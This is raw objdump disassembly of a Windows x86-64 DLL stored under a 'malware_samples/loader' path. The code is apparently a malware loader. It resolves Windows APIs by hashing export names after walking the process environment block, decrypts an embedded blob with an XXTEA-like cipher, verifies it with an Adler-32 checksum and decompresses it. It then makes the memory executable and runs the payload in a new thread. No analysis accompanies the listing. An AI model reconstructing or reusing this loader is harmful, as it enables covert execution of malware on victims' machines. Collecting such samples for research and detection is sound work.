
malware_samples/loader/66a155f6672fbbb041cb754c143db91b30084f98e9102c280ba95ffda156123b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 83 ec 28          	sub    $0x28,%rsp
   180001004:	48 8b 0d c5 c8 0a 00 	mov    0xac8c5(%rip),%rcx        # 0x1800ad8d0
   18000100b:	83 fa 01             	cmp    $0x1,%edx
   18000100e:	49 0f 44 c8          	cmove  %r8,%rcx
   180001012:	48 89 0d b7 c8 0a 00 	mov    %rcx,0xac8b7(%rip)        # 0x1800ad8d0
   180001019:	83 fa 0a             	cmp    $0xa,%edx
   18000101c:	75 08                	jne    0x180001026
   18000101e:	49 8b c8             	mov    %r8,%rcx
   180001021:	e8 3a 01 00 00       	call   0x180001160
   180001026:	b8 01 00 00 00       	mov    $0x1,%eax
   18000102b:	48 83 c4 28          	add    $0x28,%rsp
   18000102f:	c3                   	ret
   180001030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001035:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000103a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000103f:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   180001043:	4c 8b c9             	mov    %rcx,%r9
   180001046:	8b f2                	mov    %edx,%esi
   180001048:	44 8b 84 08 88 00 00 	mov    0x88(%rax,%rcx,1),%r8d
   18000104f:	00 
   180001050:	4c 03 c1             	add    %rcx,%r8
   180001053:	45 8b 50 20          	mov    0x20(%r8),%r10d
   180001057:	45 8b 58 24          	mov    0x24(%r8),%r11d
   18000105b:	4c 03 d1             	add    %rcx,%r10
   18000105e:	41 8b 58 1c          	mov    0x1c(%r8),%ebx
   180001062:	4c 03 d9             	add    %rcx,%r11
   180001065:	41 8b 78 18          	mov    0x18(%r8),%edi
   180001069:	48 03 d9             	add    %rcx,%rbx
   18000106c:	33 c9                	xor    %ecx,%ecx
   18000106e:	85 ff                	test   %edi,%edi
   180001070:	74 2d                	je     0x18000109f
   180001072:	41 8b 12             	mov    (%r10),%edx
   180001075:	49 03 d1             	add    %r9,%rdx
   180001078:	45 33 c0             	xor    %r8d,%r8d
   18000107b:	8a 02                	mov    (%rdx),%al
   18000107d:	48 ff c2             	inc    %rdx
   180001080:	41 c1 c8 0e          	ror    $0xe,%r8d
   180001084:	0f be c0             	movsbl %al,%eax
   180001087:	44 03 c0             	add    %eax,%r8d
   18000108a:	8a 02                	mov    (%rdx),%al
   18000108c:	84 c0                	test   %al,%al
   18000108e:	75 ed                	jne    0x18000107d
   180001090:	44 3b c6             	cmp    %esi,%r8d
   180001093:	74 1c                	je     0x1800010b1
   180001095:	ff c1                	inc    %ecx
   180001097:	49 83 c2 04          	add    $0x4,%r10
   18000109b:	3b cf                	cmp    %edi,%ecx
   18000109d:	72 d3                	jb     0x180001072
   18000109f:	33 c0                	xor    %eax,%eax
   1800010a1:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1800010a6:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1800010ab:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   1800010b0:	c3                   	ret
   1800010b1:	41 0f b7 0c 4b       	movzwl (%r11,%rcx,2),%ecx
   1800010b6:	8b 04 8b             	mov    (%rbx,%rcx,4),%eax
   1800010b9:	49 03 c1             	add    %r9,%rax
   1800010bc:	eb e3                	jmp    0x1800010a1
   1800010be:	cc                   	int3
   1800010bf:	cc                   	int3
   1800010c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800010c5:	57                   	push   %rdi
   1800010c6:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   1800010cd:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   1800010d4:	00 00 
   1800010d6:	8b f9                	mov    %ecx,%edi
   1800010d8:	4c 8b 50 18          	mov    0x18(%rax),%r10
   1800010dc:	49 83 c2 20          	add    $0x20,%r10
   1800010e0:	4d 8b 0a             	mov    (%r10),%r9
   1800010e3:	eb 4f                	jmp    0x180001134
   1800010e5:	49 8b 59 50          	mov    0x50(%r9),%rbx
   1800010e9:	4c 8d 1c 24          	lea    (%rsp),%r11
   1800010ed:	0f be 13             	movsbl (%rbx),%edx
   1800010f0:	48 8d 5b 02          	lea    0x2(%rbx),%rbx
   1800010f4:	8d 42 20             	lea    0x20(%rdx),%eax
   1800010f7:	44 0f b6 c0          	movzbl %al,%r8d
   1800010fb:	8d 4a bf             	lea    -0x41(%rdx),%ecx
   1800010fe:	83 f9 19             	cmp    $0x19,%ecx
   180001101:	0f b6 c2             	movzbl %dl,%eax
   180001104:	44 0f 47 c0          	cmova  %eax,%r8d
   180001108:	45 88 03             	mov    %r8b,(%r11)
   18000110b:	49 ff c3             	inc    %r11
   18000110e:	45 84 c0             	test   %r8b,%r8b
   180001111:	75 da                	jne    0x1800010ed
   180001113:	8a 04 24             	mov    (%rsp),%al
   180001116:	48 8d 14 24          	lea    (%rsp),%rdx
   18000111a:	33 c9                	xor    %ecx,%ecx
   18000111c:	48 ff c2             	inc    %rdx
   18000111f:	c1 c9 0e             	ror    $0xe,%ecx
   180001122:	0f be c0             	movsbl %al,%eax
   180001125:	03 c8                	add    %eax,%ecx
   180001127:	8a 02                	mov    (%rdx),%al
   180001129:	84 c0                	test   %al,%al
   18000112b:	75 ef                	jne    0x18000111c
   18000112d:	3b cf                	cmp    %edi,%ecx
   18000112f:	74 1b                	je     0x18000114c
   180001131:	4d 8b 09             	mov    (%r9),%r9
   180001134:	4d 3b ca             	cmp    %r10,%r9
   180001137:	75 ac                	jne    0x1800010e5
   180001139:	33 c0                	xor    %eax,%eax
   18000113b:	48 8b 9c 24 20 01 00 	mov    0x120(%rsp),%rbx
   180001142:	00 
   180001143:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   18000114a:	5f                   	pop    %rdi
   18000114b:	c3                   	ret
   18000114c:	49 8b 41 20          	mov    0x20(%r9),%rax
   180001150:	eb e9                	jmp    0x18000113b
   180001152:	cc                   	int3
   180001153:	cc                   	int3
   180001154:	48 8b 0d 75 c7 0a 00 	mov    0xac775(%rip),%rcx        # 0x1800ad8d0
   18000115b:	e9 00 00 00 00       	jmp    0x180001160
   180001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001165:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000116a:	57                   	push   %rdi
   18000116b:	48 83 ec 30          	sub    $0x30,%rsp
   18000116f:	48 8b f1             	mov    %rcx,%rsi
   180001172:	4c 8d 05 27 75 05 00 	lea    0x57527(%rip),%r8        # 0x1800586a0
   180001179:	48 8d 0d 80 2e 00 00 	lea    0x2e80(%rip),%rcx        # 0x180004000
   180001180:	ba a6 51 01 00       	mov    $0x151a6,%edx
   180001185:	e8 46 01 00 00       	call   0x1800012d0
   18000118a:	41 b9 95 46 05 00    	mov    $0x54695,%r9d
   180001190:	c7 44 24 48 00 52 05 	movl   $0x55200,0x48(%rsp)
   180001197:	00 
   180001198:	4c 8d 05 61 2e 00 00 	lea    0x2e61(%rip),%r8        # 0x180004000
   18000119f:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   1800011a4:	48 8d 0d 05 75 05 00 	lea    0x57505(%rip),%rcx        # 0x1800586b0
   1800011ab:	e8 74 0b 00 00       	call   0x180001d24
   1800011b0:	85 c0                	test   %eax,%eax
   1800011b2:	0f 85 9c 00 00 00    	jne    0x180001254
   1800011b8:	b9 4e 15 f5 1f       	mov    $0x1ff5154e,%ecx
   1800011bd:	e8 fe fe ff ff       	call   0x1800010c0
   1800011c2:	ba 35 ec 33 57       	mov    $0x5733ec35,%edx
   1800011c7:	48 8b c8             	mov    %rax,%rcx
   1800011ca:	48 8b d8             	mov    %rax,%rbx
   1800011cd:	e8 5e fe ff ff       	call   0x180001030
   1800011d2:	ba 26 d1 8b 75       	mov    $0x758bd126,%edx
   1800011d7:	48 89 05 d2 c6 0a 00 	mov    %rax,0xac6d2(%rip)        # 0x1800ad8b0
   1800011de:	48 8b cb             	mov    %rbx,%rcx
   1800011e1:	e8 4a fe ff ff       	call   0x180001030
   1800011e6:	ba 36 91 ac 32       	mov    $0x32ac9136,%edx
   1800011eb:	48 89 05 ce c6 0a 00 	mov    %rax,0xac6ce(%rip)        # 0x1800ad8c0
   1800011f2:	48 8b cb             	mov    %rbx,%rcx
   1800011f5:	48 8b f8             	mov    %rax,%rdi
   1800011f8:	e8 33 fe ff ff       	call   0x180001030
   1800011fd:	b9 ca b2 a4 bd       	mov    $0xbda4b2ca,%ecx
   180001202:	48 89 05 bf c6 0a 00 	mov    %rax,0xac6bf(%rip)        # 0x1800ad8c8
   180001209:	e8 b2 fe ff ff       	call   0x1800010c0
   18000120e:	ba 7e 91 90 5a       	mov    $0x5a90917e,%edx
   180001213:	48 8b c8             	mov    %rax,%rcx
   180001216:	e8 15 fe ff ff       	call   0x180001030
   18000121b:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   180001221:	4c 8d 05 3c 00 00 00 	lea    0x3c(%rip),%r8        # 0x180001264
   180001228:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   18000122d:	4c 8b ce             	mov    %rsi,%r9
   180001230:	33 d2                	xor    %edx,%edx
   180001232:	48 89 05 7f c6 0a 00 	mov    %rax,0xac67f(%rip)        # 0x1800ad8b8
   180001239:	33 c9                	xor    %ecx,%ecx
   18000123b:	ff d7                	call   *%rdi
   18000123d:	48 85 c0             	test   %rax,%rax
   180001240:	74 0c                	je     0x18000124e
   180001242:	83 ca ff             	or     $0xffffffff,%edx
   180001245:	48 8b c8             	mov    %rax,%rcx
   180001248:	ff 15 7a c6 0a 00    	call   *0xac67a(%rip)        # 0x1800ad8c8
   18000124e:	ff 15 ac 1d 00 00    	call   *0x1dac(%rip)        # 0x180003000
   180001254:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180001259:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   18000125e:	48 83 c4 30          	add    $0x30,%rsp
   180001262:	5f                   	pop    %rdi
   180001263:	c3                   	ret
   180001264:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001269:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000126e:	57                   	push   %rdi
   18000126f:	48 83 ec 20          	sub    $0x20,%rsp
   180001273:	8b 1d 1f 74 05 00    	mov    0x5741f(%rip),%ebx        # 0x180058698
   180001279:	48 8d 2d 30 74 05 00 	lea    0x57430(%rip),%rbp        # 0x1800586b0
   180001280:	48 8b f9             	mov    %rcx,%rdi
   180001283:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   180001288:	48 8b cd             	mov    %rbp,%rcx
   18000128b:	ba 00 52 05 00       	mov    $0x55200,%edx
   180001290:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   180001296:	ff 15 14 c6 0a 00    	call   *0xac614(%rip)        # 0x1800ad8b0
   18000129c:	41 b8 00 52 05 00    	mov    $0x55200,%r8d
   1800012a2:	48 8b d5             	mov    %rbp,%rdx
   1800012a5:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1800012a9:	ff 15 09 c6 0a 00    	call   *0xac609(%rip)        # 0x1800ad8b8
   1800012af:	48 8d 04 2b          	lea    (%rbx,%rbp,1),%rax
   1800012b3:	48 8b d5             	mov    %rbp,%rdx
   1800012b6:	48 8b cf             	mov    %rdi,%rcx
   1800012b9:	ff d0                	call   *%rax
   1800012bb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800012c0:	33 c0                	xor    %eax,%eax
   1800012c2:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1800012c7:	48 83 c4 20          	add    $0x20,%rsp
   1800012cb:	5f                   	pop    %rdi
   1800012cc:	c3                   	ret
   1800012cd:	cc                   	int3
   1800012ce:	cc                   	int3
   1800012cf:	cc                   	int3
   1800012d0:	48 8b c4             	mov    %rsp,%rax
   1800012d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1800012d7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1800012db:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800012df:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800012e3:	41 54                	push   %r12
   1800012e5:	41 56                	push   %r14
   1800012e7:	41 57                	push   %r15
   1800012e9:	8b 39                	mov    (%rcx),%edi
   1800012eb:	8d 72 ff             	lea    -0x1(%rdx),%esi
   1800012ee:	44 8b ca             	mov    %edx,%r9d
   1800012f1:	41 ba 56 da 4c b5    	mov    $0xb54cda56,%r10d
   1800012f7:	33 d2                	xor    %edx,%edx
   1800012f9:	4d 8b e0             	mov    %r8,%r12
   1800012fc:	48 8b d9             	mov    %rcx,%rbx
   1800012ff:	8d 42 34             	lea    0x34(%rdx),%eax
   180001302:	41 f7 f1             	div    %r9d
   180001305:	69 d0 47 86 c8 61    	imul   $0x61c88647,%eax,%edx
   18000130b:	44 2b d2             	sub    %edx,%r10d
   18000130e:	83 fe 01             	cmp    $0x1,%esi
   180001311:	0f 82 b2 00 00 00    	jb     0x1800013c9
   180001317:	45 85 d2             	test   %r10d,%r10d
   18000131a:	0f 84 a9 00 00 00    	je     0x1800013c9
   180001320:	4c 8d 34 b1          	lea    (%rcx,%rsi,4),%r14
   180001324:	45 8b da             	mov    %r10d,%r11d
   180001327:	8b ee                	mov    %esi,%ebp
   180001329:	49 c1 eb 02          	shr    $0x2,%r11
   18000132d:	4d 8b fe             	mov    %r14,%r15
   180001330:	41 83 e3 03          	and    $0x3,%r11d
   180001334:	44 8d 4d ff          	lea    -0x1(%rbp),%r9d
   180001338:	44 8b c7             	mov    %edi,%r8d
   18000133b:	42 8b 14 8b          	mov    (%rbx,%r9,4),%edx
   18000133f:	8b cf                	mov    %edi,%ecx
   180001341:	41 c1 e0 02          	shl    $0x2,%r8d
   180001345:	8b c2                	mov    %edx,%eax
   180001347:	c1 e8 05             	shr    $0x5,%eax
   18000134a:	44 33 c0             	xor    %eax,%r8d
   18000134d:	c1 e9 03             	shr    $0x3,%ecx
   180001350:	8b c2                	mov    %edx,%eax
   180001352:	c1 e0 04             	shl    $0x4,%eax
   180001355:	33 c8                	xor    %eax,%ecx
   180001357:	8b c5                	mov    %ebp,%eax
   180001359:	44 03 c1             	add    %ecx,%r8d
   18000135c:	83 e0 03             	and    $0x3,%eax
   18000135f:	49 33 c3             	xor    %r11,%rax
   180001362:	41 8b e9             	mov    %r9d,%ebp
   180001365:	41 8b 0c 84          	mov    (%r12,%rax,4),%ecx
   180001369:	41 8b c2             	mov    %r10d,%eax
   18000136c:	33 c7                	xor    %edi,%eax
   18000136e:	33 ca                	xor    %edx,%ecx
   180001370:	03 c8                	add    %eax,%ecx
   180001372:	44 33 c1             	xor    %ecx,%r8d
   180001375:	45 29 07             	sub    %r8d,(%r15)
   180001378:	45 8b c1             	mov    %r9d,%r8d
   18000137b:	41 8b 3f             	mov    (%r15),%edi
   18000137e:	4d 8d 7f fc          	lea    -0x4(%r15),%r15
   180001382:	45 85 c9             	test   %r9d,%r9d
   180001385:	75 ad                	jne    0x180001334
   180001387:	41 8b 06             	mov    (%r14),%eax
   18000138a:	8b d7                	mov    %edi,%edx
   18000138c:	c1 e8 05             	shr    $0x5,%eax
   18000138f:	8b cf                	mov    %edi,%ecx
   180001391:	c1 e2 02             	shl    $0x2,%edx
   180001394:	41 33 fa             	xor    %r10d,%edi
   180001397:	33 d0                	xor    %eax,%edx
   180001399:	c1 e9 03             	shr    $0x3,%ecx
   18000139c:	41 8b 06             	mov    (%r14),%eax
   18000139f:	41 83 e0 03          	and    $0x3,%r8d
   1800013a3:	c1 e0 04             	shl    $0x4,%eax
   1800013a6:	4d 33 c3             	xor    %r11,%r8
   1800013a9:	33 c8                	xor    %eax,%ecx
   1800013ab:	03 d1                	add    %ecx,%edx
   1800013ad:	43 8b 04 84          	mov    (%r12,%r8,4),%eax
   1800013b1:	41 33 06             	xor    (%r14),%eax
   1800013b4:	03 c7                	add    %edi,%eax
   1800013b6:	33 d0                	xor    %eax,%edx
   1800013b8:	29 13                	sub    %edx,(%rbx)
   1800013ba:	8b 3b                	mov    (%rbx),%edi
   1800013bc:	41 81 c2 47 86 c8 61 	add    $0x61c88647,%r10d
   1800013c3:	0f 85 5b ff ff ff    	jne    0x180001324
   1800013c9:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   1800013ce:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   1800013d3:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1800013d8:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   1800013dd:	41 5f                	pop    %r15
   1800013df:	41 5e                	pop    %r14
   1800013e1:	41 5c                	pop    %r12
   1800013e3:	c3                   	ret
   1800013e4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800013e9:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   1800013ee:	45 33 c0             	xor    %r8d,%r8d
   1800013f1:	44 8b da             	mov    %edx,%r11d
   1800013f4:	4c 8b d1             	mov    %rcx,%r10
   1800013f7:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800013fd:	85 d2                	test   %edx,%edx
   1800013ff:	0f 84 2b 01 00 00    	je     0x180001530
   180001405:	bf b0 15 00 00       	mov    $0x15b0,%edi
   18000140a:	44 3b df             	cmp    %edi,%r11d
   18000140d:	41 0f 42 fb          	cmovb  %r11d,%edi
   180001411:	8b c7                	mov    %edi,%eax
   180001413:	99                   	cltd
   180001414:	83 e2 0f             	and    $0xf,%edx
   180001417:	03 c2                	add    %edx,%eax
   180001419:	8b d8                	mov    %eax,%ebx
   18000141b:	83 e0 0f             	and    $0xf,%eax
   18000141e:	2b c2                	sub    %edx,%eax
   180001420:	c1 fb 04             	sar    $0x4,%ebx
   180001423:	8b c8                	mov    %eax,%ecx
   180001425:	85 db                	test   %ebx,%ebx
   180001427:	0f 84 bc 00 00 00    	je     0x1800014e9
   18000142d:	41 0f b6 02          	movzbl (%r10),%eax
   180001431:	44 03 c8             	add    %eax,%r9d
   180001434:	41 0f b6 42 01       	movzbl 0x1(%r10),%eax
   180001439:	45 03 c1             	add    %r9d,%r8d
   18000143c:	44 03 c8             	add    %eax,%r9d
   18000143f:	41 0f b6 42 02       	movzbl 0x2(%r10),%eax
   180001444:	45 03 c1             	add    %r9d,%r8d
   180001447:	44 03 c8             	add    %eax,%r9d
   18000144a:	41 0f b6 42 03       	movzbl 0x3(%r10),%eax
   18000144f:	45 03 c1             	add    %r9d,%r8d
   180001452:	44 03 c8             	add    %eax,%r9d
   180001455:	41 0f b6 42 04       	movzbl 0x4(%r10),%eax
   18000145a:	45 03 c1             	add    %r9d,%r8d
   18000145d:	44 03 c8             	add    %eax,%r9d
   180001460:	41 0f b6 42 05       	movzbl 0x5(%r10),%eax
   180001465:	45 03 c1             	add    %r9d,%r8d
   180001468:	44 03 c8             	add    %eax,%r9d
   18000146b:	41 0f b6 42 06       	movzbl 0x6(%r10),%eax
   180001470:	45 03 c1             	add    %r9d,%r8d
   180001473:	44 03 c8             	add    %eax,%r9d
   180001476:	41 0f b6 42 07       	movzbl 0x7(%r10),%eax
   18000147b:	45 03 c1             	add    %r9d,%r8d
   18000147e:	44 03 c8             	add    %eax,%r9d
   180001481:	41 0f b6 42 08       	movzbl 0x8(%r10),%eax
   180001486:	45 03 c1             	add    %r9d,%r8d
   180001489:	44 03 c8             	add    %eax,%r9d
   18000148c:	41 0f b6 42 09       	movzbl 0x9(%r10),%eax
   180001491:	45 03 c1             	add    %r9d,%r8d
   180001494:	44 03 c8             	add    %eax,%r9d
   180001497:	41 0f b6 42 0a       	movzbl 0xa(%r10),%eax
   18000149c:	45 03 c1             	add    %r9d,%r8d
   18000149f:	44 03 c8             	add    %eax,%r9d
   1800014a2:	41 0f b6 42 0b       	movzbl 0xb(%r10),%eax
   1800014a7:	45 03 c1             	add    %r9d,%r8d
   1800014aa:	44 03 c8             	add    %eax,%r9d
   1800014ad:	41 0f b6 42 0c       	movzbl 0xc(%r10),%eax
   1800014b2:	45 03 c1             	add    %r9d,%r8d
   1800014b5:	44 03 c8             	add    %eax,%r9d
   1800014b8:	41 0f b6 42 0d       	movzbl 0xd(%r10),%eax
   1800014bd:	45 03 c1             	add    %r9d,%r8d
   1800014c0:	44 03 c8             	add    %eax,%r9d
   1800014c3:	41 0f b6 42 0e       	movzbl 0xe(%r10),%eax
   1800014c8:	45 03 c1             	add    %r9d,%r8d
   1800014cb:	44 03 c8             	add    %eax,%r9d
   1800014ce:	41 0f b6 42 0f       	movzbl 0xf(%r10),%eax
   1800014d3:	45 03 c1             	add    %r9d,%r8d
   1800014d6:	49 83 c2 10          	add    $0x10,%r10
   1800014da:	44 03 c8             	add    %eax,%r9d
   1800014dd:	45 03 c1             	add    %r9d,%r8d
   1800014e0:	83 eb 01             	sub    $0x1,%ebx
   1800014e3:	0f 85 44 ff ff ff    	jne    0x18000142d
   1800014e9:	85 c9                	test   %ecx,%ecx
   1800014eb:	74 12                	je     0x1800014ff
   1800014ed:	41 0f b6 02          	movzbl (%r10),%eax
   1800014f1:	49 ff c2             	inc    %r10
   1800014f4:	44 03 c8             	add    %eax,%r9d
   1800014f7:	45 03 c1             	add    %r9d,%r8d
   1800014fa:	83 e9 01             	sub    $0x1,%ecx
   1800014fd:	75 ee                	jne    0x1800014ed
   1800014ff:	b8 71 80 07 80       	mov    $0x80078071,%eax
   180001504:	41 f7 e1             	mul    %r9d
   180001507:	c1 ea 0f             	shr    $0xf,%edx
   18000150a:	69 c2 0f 00 ff ff    	imul   $0xffff000f,%edx,%eax
   180001510:	44 03 c8             	add    %eax,%r9d
   180001513:	b8 71 80 07 80       	mov    $0x80078071,%eax
   180001518:	41 f7 e0             	mul    %r8d
   18000151b:	c1 ea 0f             	shr    $0xf,%edx
   18000151e:	69 ca 0f 00 ff ff    	imul   $0xffff000f,%edx,%ecx
   180001524:	44 03 c1             	add    %ecx,%r8d
   180001527:	44 2b df             	sub    %edi,%r11d
   18000152a:	0f 85 d5 fe ff ff    	jne    0x180001405
   180001530:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180001535:	48 8b 7c 24 10       	mov    0x10(%rsp),%rdi
   18000153a:	41 c1 e0 10          	shl    $0x10,%r8d
   18000153e:	45 0b c1             	or     %r9d,%r8d
   180001541:	41 8b c0             	mov    %r8d,%eax
   180001544:	c3                   	ret
   180001545:	cc                   	int3
   180001546:	cc                   	int3
   180001547:	cc                   	int3
   180001548:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000154d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001552:	57                   	push   %rdi
   180001553:	48 83 ec 20          	sub    $0x20,%rsp
   180001557:	33 f6                	xor    %esi,%esi
   180001559:	4c 8b da             	mov    %rdx,%r11
   18000155c:	44 0f b7 ce          	movzwl %si,%r9d
   180001560:	41 8b d8             	mov    %r8d,%ebx
   180001563:	41 8b c1             	mov    %r9d,%eax
   180001566:	4c 8b d1             	mov    %rcx,%r10
   180001569:	41 c1 e1 10          	shl    $0x10,%r9d
   18000156d:	8b d6                	mov    %esi,%edx
   18000156f:	44 0b c8             	or     %eax,%r9d
   180001572:	8d 7e 01             	lea    0x1(%rsi),%edi
   180001575:	66 41 0f 6e c1       	movd   %r9d,%xmm0
   18000157a:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   18000157f:	0f 11 01             	movups %xmm0,(%rcx)
   180001582:	0f 11 41 10          	movups %xmm0,0x10(%rcx)
   180001586:	83 89 60 02 00 00 ff 	orl    $0xffffffff,0x260(%rcx)
   18000158d:	45 85 c0             	test   %r8d,%r8d
   180001590:	74 20                	je     0x1800015b2
   180001592:	49 8b cb             	mov    %r11,%rcx
   180001595:	40 38 31             	cmp    %sil,(%rcx)
   180001598:	74 0f                	je     0x1800015a9
   18000159a:	41 89 92 60 02 00 00 	mov    %edx,0x260(%r10)
   1800015a1:	0f b6 01             	movzbl (%rcx),%eax
   1800015a4:	66 41 01 3c 42       	add    %di,(%r10,%rax,2)
   1800015a9:	03 d7                	add    %edi,%edx
   1800015ab:	48 03 cf             	add    %rdi,%rcx
   1800015ae:	3b d3                	cmp    %ebx,%edx
   1800015b0:	72 e3                	jb     0x180001595
   1800015b2:	8b c7                	mov    %edi,%eax
   1800015b4:	8b d6                	mov    %esi,%edx
   1800015b6:	8b ce                	mov    %esi,%ecx
   1800015b8:	44 8b c9             	mov    %ecx,%r9d
   1800015bb:	47 0f b7 04 4a       	movzwl (%r10,%r9,2),%r8d
   1800015c0:	44 3b c0             	cmp    %eax,%r8d
   1800015c3:	77 76                	ja     0x18000163b
   1800015c5:	41 2b c0             	sub    %r8d,%eax
   1800015c8:	66 42 89 14 4c       	mov    %dx,(%rsp,%r9,2)
   1800015cd:	03 c0                	add    %eax,%eax
   1800015cf:	41 03 d0             	add    %r8d,%edx
   1800015d2:	03 cf                	add    %edi,%ecx
   1800015d4:	83 f9 10             	cmp    $0x10,%ecx
   1800015d7:	72 df                	jb     0x1800015b8
   1800015d9:	3b d7                	cmp    %edi,%edx
   1800015db:	76 06                	jbe    0x1800015e3
   1800015dd:	85 c0                	test   %eax,%eax
   1800015df:	75 5a                	jne    0x18000163b
   1800015e1:	3b d7                	cmp    %edi,%edx
   1800015e3:	75 07                	jne    0x1800015ec
   1800015e5:	66 41 39 7a 02       	cmp    %di,0x2(%r10)
   1800015ea:	75 4f                	jne    0x18000163b
   1800015ec:	44 8b c6             	mov    %esi,%r8d
   1800015ef:	85 db                	test   %ebx,%ebx
   1800015f1:	74 26                	je     0x180001619
   1800015f3:	41 38 33             	cmp    %sil,(%r11)
   1800015f6:	74 16                	je     0x18000160e
   1800015f8:	41 0f b6 03          	movzbl (%r11),%eax
   1800015fc:	0f b7 0c 44          	movzwl (%rsp,%rax,2),%ecx
   180001600:	66 45 89 44 4a 20    	mov    %r8w,0x20(%r10,%rcx,2)
   180001606:	41 0f b6 03          	movzbl (%r11),%eax
   18000160a:	66 01 3c 44          	add    %di,(%rsp,%rax,2)
   18000160e:	44 03 c7             	add    %edi,%r8d
   180001611:	4c 03 df             	add    %rdi,%r11
   180001614:	44 3b c3             	cmp    %ebx,%r8d
   180001617:	72 da                	jb     0x1800015f3
   180001619:	3b d7                	cmp    %edi,%edx
   18000161b:	75 1a                	jne    0x180001637
   18000161d:	b8 02 00 00 00       	mov    $0x2,%eax
   180001622:	66 41 89 42 02       	mov    %ax,0x2(%r10)
   180001627:	41 0f b7 82 60 02 00 	movzwl 0x260(%r10),%eax
   18000162e:	00 
   18000162f:	66 03 c7             	add    %di,%ax
   180001632:	66 41 89 42 22       	mov    %ax,0x22(%r10)
   180001637:	33 c0                	xor    %eax,%eax
   180001639:	eb 05                	jmp    0x180001640
   18000163b:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
   180001640:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001645:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000164a:	48 83 c4 20          	add    $0x20,%rsp
   18000164e:	5f                   	pop    %rdi
   18000164f:	c3                   	ret
   180001650:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001655:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000165a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000165f:	57                   	push   %rdi
   180001660:	41 56                	push   %r14
   180001662:	41 57                	push   %r15
   180001664:	48 83 ec 20          	sub    $0x20,%rsp
   180001668:	48 8b f2             	mov    %rdx,%rsi
   18000166b:	33 ed                	xor    %ebp,%ebp
   18000166d:	4c 8b f9             	mov    %rcx,%r15
   180001670:	8d 55 01             	lea    0x1(%rbp),%edx
   180001673:	e8 20 02 00 00       	call   0x180001898
   180001678:	0f b7 56 02          	movzwl 0x2(%rsi),%edx
   18000167c:	8b f8                	mov    %eax,%edi
   18000167e:	3b c2                	cmp    %edx,%eax
   180001680:	7c 2a                	jl     0x1800016ac
   180001682:	44 8d 75 01          	lea    0x1(%rbp),%r14d
   180001686:	0f b7 da             	movzwl %dx,%ebx
   180001689:	49 8b cf             	mov    %r15,%rcx
   18000168c:	ba 01 00 00 00       	mov    $0x1,%edx
   180001691:	03 eb                	add    %ebx,%ebp
   180001693:	49 ff c6             	inc    %r14
   180001696:	e8 fd 01 00 00       	call   0x180001898
   18000169b:	2b fb                	sub    %ebx,%edi
   18000169d:	8d 3c 78             	lea    (%rax,%rdi,2),%edi
   1800016a0:	42 0f b7 04 76       	movzwl (%rsi,%r14,2),%eax
   1800016a5:	0f b7 d0             	movzwl %ax,%edx
   1800016a8:	3b f8                	cmp    %eax,%edi
   1800016aa:	7d da                	jge    0x180001686
   1800016ac:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800016b1:	8d 04 2f             	lea    (%rdi,%rbp,1),%eax
   1800016b4:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1800016b9:	48 63 c8             	movslq %eax,%rcx
   1800016bc:	0f b7 44 4e 20       	movzwl 0x20(%rsi,%rcx,2),%eax
   1800016c1:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1800016c6:	48 83 c4 20          	add    $0x20,%rsp
   1800016ca:	41 5f                	pop    %r15
   1800016cc:	41 5e                	pop    %r14
   1800016ce:	5f                   	pop    %rdi
   1800016cf:	c3                   	ret
   1800016d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800016d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800016da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800016df:	57                   	push   %rdi
   1800016e0:	41 54                	push   %r12
